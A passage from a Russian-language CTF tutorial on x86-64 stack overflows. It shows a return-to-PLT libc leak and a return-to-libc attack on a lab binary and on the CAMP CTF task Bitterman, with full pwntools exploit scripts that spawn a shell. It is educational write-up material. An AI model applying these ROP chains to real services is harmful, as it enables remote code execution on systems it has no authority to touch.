	puts(addr);

	return 0;
}
```

[![ret2plt-poc.png](/assets/images/pwn-kingdom/bitterman/ret2plt-poc.png)](/assets/images/pwn-kingdom/bitterman/ret2plt-poc.png)
{:.center-image}

Как можно видеть, адрес `puts` меняется с каждым вызовом программы.

Таким образом, наша атака будет состоять из двух фаз:

1. Получение «слитого» адреса `puts` в libc, расчет реального адреса загрузки библиотеки, как `LIBC_start_main = СЛИТЫЙ_адрес_puts - СМЕЩЕНИЕ_puts_относительно_libc`, и перезапуск программы прыжком на функцию `main`.
2. Расчет реальных адресов функций `system`, `exit` и строки `"/bin/sh"` (с помощью добытого в первой фазе адреса загрузки libc) и выполнение классической 64-битной атаки ret2libc аналогично примеру из второго кейса.

Пейлоад для первой фазы будет иметь такой вид.

```
ПЕЙЛОАД = 
	(1) МУСОР_120_байт +
	(2) ГАДЖЕТ_pop_rdi +
	(3) GOT_puts +
	(4) PLT_puts +
	(5) АДРЕС_main
```

А для второй, соответственно, такой.

```
ПЕЙЛОАД2 = 
	(1) МУСОР_120_байт +
	(2) ГАДЖЕТ_pop_rdi +
	(3) СТРОКА_bin_sh +
	(4) ГАДЖЕТ_nop +
	(5) АДРЕС_system +
	(6) АДРЕС_exit
```

### Сбор адресов и конечный эксплоит

Все необходимые адреса и смещения можно найти за 5 команд (я не останавливаюсь здесь слишком подробно, потому что все это мы уже делали).

```
$ ropper --file ret2plt --arch x86_64 --search 'pop rdi; ret'
$ ropper --file ret2plt --arch x86_64 --search 'nop; ret'
$ objdump -D ret2plt | grep -e 'puts' -e '<main>'
$ readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -e ' puts@' -e ' system@' -e ' exit@'
$ strings -atx /usr/lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
```

[![ret2plt-find-addr.png](/assets/images/pwn-kingdom/bitterman/ret2plt-find-addr.png)](/assets/images/pwn-kingdom/bitterman/ret2plt-find-addr.png)
{:.center-image}

На рисунке имена значениям я присвоил такие же, как в теле кода эксплоита.

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# Использование: python pwn-ret2plt.py [DEBUG]

from pwn import *
import time

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64
context.terminal  = ['tmux', 'new-window']

junk = 'A' * 120
pop_rdi_gadget = p64(0x401136)
nop_gadget = p64(0x4010af)
puts_plt = p64(0x401030)
puts_got = p64(0x404018)
main_offset = p64(0x40115a)

payload = junk + pop_rdi_gadget + puts_got + puts_plt + main_offset

p = process('./ret2plt')

"""
gdb.attach(p, '''
init-peda
start''')

# Нужен raw_input(), когда юзаешь gdb.debug() вместо gdb.attach()
"""

p.recvuntil('Case 3: Return-to-PLT')
raw_input('[?] (1-я фаза) Отправляю пейлоад?')
p.clean()
p.sendline(payload)
received = p.recvuntil('Case 3: Return-to-PLT')[:6].strip()
leaked_puts = u64(received.ljust(8, '\x00'))
log.success('(1-я фаза) Слитый адрес puts@GLIBC (./ret2plt): %s' % hex(leaked_puts))

puts_offset = 0x83cc0
libc_start = leaked_puts - puts_offset
log.success('(1-я фаза) Вычислен адрес __libc_start_main (libc): %s' % hex(libc_start))

system_offset = 0x52fd0
bin_sh_offset = 0x1afb84
exit_offset = 0x473c0

system_addr = libc_start + system_offset
log.success('(2-я фаза) Вычислен адрес system (libc): %s' % hex(system_addr))

bin_sh_addr = libc_start + bin_sh_offset
log.success('(2-я фаза) Вычислен адрес "/bin/sh" (libc): %s' % hex(bin_sh_addr))

exit_addr = libc_start + exit_offset
log.success('(2-я фаза) Вычислен адрес exit (libc): %s' % hex(exit_addr))

system_addr = p64(system_addr)
bin_sh_addr = p64(bin_sh_addr)
exit_addr = p64(exit_addr)

payload2 = junk + pop_rdi_gadget + bin_sh_addr + nop_gadget + system_addr + exit_addr

#p.recvuntil('Case 3: Return-to-PLT')
raw_input('[?] (2-я фаза) Отправляю пейлоад?')
p.clean()
p.sendline(payload2)

p.clean()
p.interactive()
```

Раз — и у нас уже есть шелл!

[![ret2plt-pwn.png](/assets/images/pwn-kingdom/bitterman/ret2plt-pwn.png)](/assets/images/pwn-kingdom/bitterman/ret2plt-pwn.png)
{:.center-image}

### Что если версия libc неизвестна?

Как быть, если бы у тебя не было доступа к используемой библиотеки libc? Как в этом случае узнать нужные смещения, ведь они различны для различных версий?

В этом случае спасет проект [libc-database](https://github.com/niklasb/libc-database), который аккумулирует все версии libc, и позволяет осуществлять по ним поиск. Можно загрузить и собрать базу локально, а можно воспользоваться [веб-версией](https://libc.blukat.me/) онлайн.

Так как рандомизация памяти работает на страничном уровне, последние 12 бит (3 символа) смещения, как правило, остаются неизменными, что позволяет по «слитому» адресу функции `puts` угадать версию библиотеки.

[![libc-database-search.png](/assets/images/pwn-kingdom/bitterman/libc-database-search.png)](/assets/images/pwn-kingdom/bitterman/libc-database-search.png)
{:.center-image}

Если скачать предложенную версию и проверить хеш-суммы, то окажется, что это и правда та же самая библиотека, которая используется на моем стенде.

```
$ wget -q https://libc.blukat.me/d/libc6_2.29-0ubuntu2_amd64.so
$ md5sum libc6_2.29-0ubuntu2_amd64.so /usr/lib/x86_64-linux-gnu/libc.so.6
2fb0d6800d4d79ffdc7a388d7fe6aea0  libc6_2.29-0ubuntu2_amd64.so
2fb0d6800d4d79ffdc7a388d7fe6aea0  /usr/lib/x86_64-linux-gnu/libc.so.6
```

# Bitterman

> Can you [exploit](https://archive.aachen.ccc.de/campctf.ccc.ac/uploads/bitterman) this one for me? bitterman is running on localhost:10103 This time NX is enabled, to make sure it's not too easy. Here's the [libc](https://archive.aachen.ccc.de/campctf.ccc.ac/uploads/libc.so.6).

Примерно так выглядело условие к оригинальному таску Bitterman. Разве что URL, на котором хостился бинарь, был другим.

Для аутентичности переместимся на Kali, загрузим исполняемый файл и проведем быстрый анализ.

[![bitterman-run.png](/assets/images/pwn-kingdom/bitterman/bitterman-run.png)](/assets/images/pwn-kingdom/bitterman/bitterman-run.png)
{:.center-image}

Как можно видеть, весь функционал этой вежливой программы сводится к приветствию, запросу длины вводимой пользователем строки и, собственно, самой строки.

Методом тыка выясняется, что последний ввод уязвим к переполнению буфера.

[![bitterman-overflow.png](/assets/images/pwn-kingdom/bitterman/bitterman-overflow.png)](/assets/images/pwn-kingdom/bitterman/bitterman-overflow.png)
{:.center-image}

## Статический анализ

Посмотрим на дизассемблер функции `main` в Radare2.

```
$ r2 ./bitterman
 -- Welcome to IDA 10.0.
[0x00400590]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400590]> pdf @ main
...
```

[![bitterman-r2.png](/assets/images/pwn-kingdom/bitterman/bitterman-r2.png)](/assets/images/pwn-kingdom/bitterman/bitterman-r2.png)
{:.center-image}

Спойлер: красным выделена уязвимая функция ввода.

Если у тебя нет возможности приобрести IDA Pro (а пиратство мы не одобряем), для нужд декомпиляции исполняемых файлов удобно пользоваться инструментарием [Ghidra](https://github.com/NationalSecurityAgency/ghidra), который АНБ так любезно подарила простым смертным.

[![bitterman-ghidra.png](/assets/images/pwn-kingdom/bitterman/bitterman-ghidra.png)](/assets/images/pwn-kingdom/bitterman/bitterman-ghidra.png)
{:.center-image}

Если посмотреть на псевдокод функций `main` и `read_nbytes`, можно составить такой исходник на псевдо C, который будет отражать поведение Bitterman.

```c
// bitterman.c

int read_nbytes(char *dst,size_t nbytes) {
  int iVar1;
  ssize_t sVar2;
  long lVar3;
  int i;
  
  i = 0;
  while( true ) {
    if (nbytes <= (ulong)(long)i) {
      return i;
    }
    sVar2 = read(0,dst + i,1);
    if (sVar2 == 0) break;
    iVar1 = i + 1;
    lVar3 = (long)i;
    i = iVar1;
    if (dst[lVar3] == '\n') {
      return iVar1;
    }
  }
  return i;
}

int main(int argc,char **argv) {
  int iVar1;
  size_t nbytes;
  char buf [64];
  char username [64];
  size_t size;
  
  puts("> What\'s your name? ");
  fflush(stdout);
  read_nbytes(username,0x40);
  printf("Hi, %s\n",username);
  puts("> Please input the length of your message: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_004008c4,&nbytes);
  puts("> Please enter your text: ");
  fflush(stdout);
  iVar1 = read_nbytes(buf,nbytes);  // <-- УЯЗВИМЫЙ КОД
  if (iVar1 != 0) {
    puts("> Thanks!");
    fflush(stdout);
  }
  return 0;
}
```

Второй вызов `read_nbytes` происходит с подконтрольным нам значением количества байт, которые нужно считать, а размер буфера фиксирован — 64 байта. Уверен, ты уже понял, что нужно делать... :smiling_imp:

## Динамический анализ

Запустим отладчик и рассчитаем точку перезаписи RIP с помощью циклического паттерна.

[![bitterman-pattern-create.png](/assets/images/pwn-kingdom/bitterman/bitterman-pattern-create.png)](/assets/images/pwn-kingdom/bitterman/bitterman-pattern-create.png)
{:.center-image}

Генерим строку в 500 символов и скармливаем программе в уязвимом input'е.

[![bitterman-pattern-offset.png](/assets/images/pwn-kingdom/bitterman/bitterman-pattern-offset.png)](/assets/images/pwn-kingdom/bitterman/bitterman-pattern-offset.png)
{:.center-image}

Итак, нам нужно 152 байта для того, чтобы добраться до адреса возврата.

## Темная магия pwntools

Вектор атаки точно такой же, как в тренировочном кейсе № 3, и чтобы не повторяться с почти таким же кодом эксплоита, я покажу, как pwntools позволяет практически полностью автоматизировать действия нарушителя.

Чтобы немного разнообразить наш девелопмент, с помощью `socat` подвесим процесс Bitterman'а к localhost'у на порт `10103` (оригинальность таска сохранена), чтобы можно было подключаться к нему через сокет из соседнего терминала.

```
$ socat TCP-LISTEN:10103,reuseaddr,fork EXEC:./bitterman
```

Из-за этого нововведения я буду обращаться к процессу с помощью функции `pwnlib.tubes.remote`, а не `pwnlib.tubes.process`, как раньше.

### Фаза 1. Return-to-PLT

Разберем будущий сплоит по частям. В первой фазе (Return-to-PLT), как ты помнишь, мы искали нужные гаджеты для того, чтобы узнать реальный адрес функции `puts`.

```python
# ----------------- Фаза 1. Return-to-PLT ------------------

bitterman = ELF('./bitterman')
rop = ROP(bitterman)

log.info('Фаза 1. Return-to-PLT')
rop.puts(bitterman.got['puts'])
log.success('Найдены адреса puts (PLT & GOT)')
rop.call(bitterman.symbols['main'])
log.success('Найден адрес main')
log.info('ROP:\n' + rop.dump())

junk = 'A' * (cyclic_find(unhex('6261616f')[::-1]) - 4)  # 'A' * 152
log.success('Вычислено смещение последовательности де Брёйна: %s' % len(junk))

payload = junk + str(rop)

r = remote('localhost', '10103')
#p = process('./bitterman')

"""
gdb.attach(p, '''
init-peda
start''')
"""

r.recvuntil('What\'s your name?')
r.sendline('snovvcrash')
r.recvuntil('Please input the length of your message:')
r.sendline('31337')
r.recvuntil('Please enter your text:')
r.clean()
raw_input('[?] Отправляю пейлоад?')
r.sendline(payload)
r.recvuntil('Thanks!')
received = r.recvuntil('What\'s your name?')[:8].strip()
leaked_puts = u64(received.ljust(8, '\x00'))
log.success('Слитый адрес puts@GLIBC: %s' % hex(leaked_puts))
```

В pwntools есть специальный класс `ROP`, который найдет за тебя все, что душе угодно (разумеется, в рамках разумного).

```python
rop.puts(bitterman.got['puts'])
rop.call(bitterman.symbols['main'])
```

Этими двумя строками я инициализирую ROP-цепочку тремя гаджетами: инструкции `pop rdi; ret` (находятся автоматически — даже ничего не нужно указывать в явном виде!), вызов `puts` с «самим собой» в качестве аргумента (чтобы стриггерить утечку адреса) и вызов `main`.

```python
junk = 'A' * (cyclic_find(unhex('6261616f')[::-1]) - 4)  # 'A' * 152
```

А здесь я на лету высчитываю нужный размер «мусорной» строки (помним, что он равен 152 байтам). Правда, чтобы это сработало, нужно скормить Bitterman циклический паттерн, который генерирует pwntools (а не PEDA — они различаются), и узнать 4 младших байта, лежащие в RSP (как мы делали уже не один раз).

Сгенерировать паттерн, который предлагает pwntools, можно с помощью такой простой команды.

```
$ python2 -c 'import pwn; print pwn.cyclic(500)'
```

После чего я взаимодействую с удаленным процессом: отправляю пейлоад и извлекаю «слитый» адрес `puts`.

### Фаза 2. Return-to-libc

Во второй фазе мы проворачиваем уже знакомую тебе атаку Return-to-libc, которая также отлично поддается автоматизации.

```python
# ----------------- Фаза 2. Return-to-libc -----------------

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)

log.info('Фаза 2. Return-to-libc')
rop2.system(next(libc.search('/bin/sh\x00')))
log.success('Составлен пейлоад для атаки ret2libc')
log.info('ROP2:\n' + rop2.dump())

payload2 = junk + str(rop2)

#r.recvuntil('What\'s your name?')
r.sendline('snovvcrash')
r.recvuntil('Please input the length of your message:')
r.sendline('31337')
r.recvuntil('Please enter your text:')
r.clean()
raw_input('[?] Отправляю пейлоад2?')
r.sendline(payload2)
r.recvuntil('Thanks!')
r.clean()

r.interactive()
```

Остановимся на самых интересных моментах.

```python
libc.address = leaked_puts - libc.symbols['puts']
```

Здесь я присваиваю объекту libc реальный адрес загрузки библиотеки (полученный в первой фазе), чтобы pwntools знал, где искать либу.

```python
rop2.system(next(libc.search('/bin/sh\x00')))
```

А после создаю второй объект класса `ROP` и наполняю его снова тремя гаджетами: инструкции `pop rdi; ret`, адрес строки `/bin/sh` и вызов библиотечной функции `system`. Для этого мне нужно всего одна строка.

Вот полный код экслоита.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Использование: python exploit.py [DEBUG]

from pwn import *

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64
context.terminal  = ['tmux', 'new-window']

# ----------------- Фаза 1. Return-to-PLT ------------------

bitterman = ELF('./bitterman')
rop = ROP(bitterman)

log.info('Фаза 1. Return-to-PLT')
rop.puts(bitterman.got['puts'])
log.success('Найдены адреса puts (PLT & GOT)')
rop.call(bitterman.symbols['main'])
log.success('Найден адрес main')
log.info('ROP:\n' + rop.dump())

junk = 'A' * (cyclic_find(unhex('6261616f')[::-1]) - 4)  # 'A' * 152
log.success('Вычислено смещение последовательности де Брёйна: %s' % len(junk))

payload = junk + str(rop)

r = remote('localhost', '10103')
#p = process('./bitterman')

"""
gdb.attach(p, '''
init-peda
start''')
"""

r.recvuntil('What\'s your name?')
r.sendline('snovvcrash')
r.recvuntil('Please input the length of your message:')
r.sendline('31337')
r.recvuntil('Please enter your text:')
r.clean()
raw_input('[?] Отправляю пейлоад?')
r.sendline(payload)
r.recvuntil('Thanks!')
received = r.recvuntil('What\'s your name?')[:8].strip()
leaked_puts = u64(received.ljust(8, '\x00'))
log.success('Слитый адрес puts@GLIBC: %s' % hex(leaked_puts))

# ----------------- Фаза 2. Return-to-libc -----------------

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)

log.info('Фаза 2. Return-to-libc')
rop2.system(next(libc.search('/bin/sh\x00')))
log.success('Составлена пейлоад для атаки ret2libc')
log.info('ROP2:\n' + rop2.dump())

payload2 = junk + str(rop2)

#r.recvuntil('What\'s your name?')
r.sendline('snovvcrash')
r.recvuntil('Please input the length of your message:')
r.sendline('31337')
r.recvuntil('Please enter your text:')
r.clean()
raw_input('[?] Отправляю пейлоад2?')
r.sendline(payload2)
r.recvuntil('Thanks!')
r.clean()

r.interactive()
```

Выполним то, что мы натворили, и получим, наконец, свой шелл.

[![bitterman-pwn.png](/assets/images/pwn-kingdom/bitterman/bitterman-pwn.png)](/assets/images/pwn-kingdom/bitterman/bitterman-pwn.png)
{:.center-image}

Bitterman has been PwN3d! :triumph:

В [четвертой](https://snovvcrash.github.io/2019/12/20/htb-smasher.html) (и заключительной) части серии мы разберем тачку Smasher с Hack The Box, изюминкой прохождения которой стал низкоуровневый сплоитинг веб-сервера. Stay tuned!
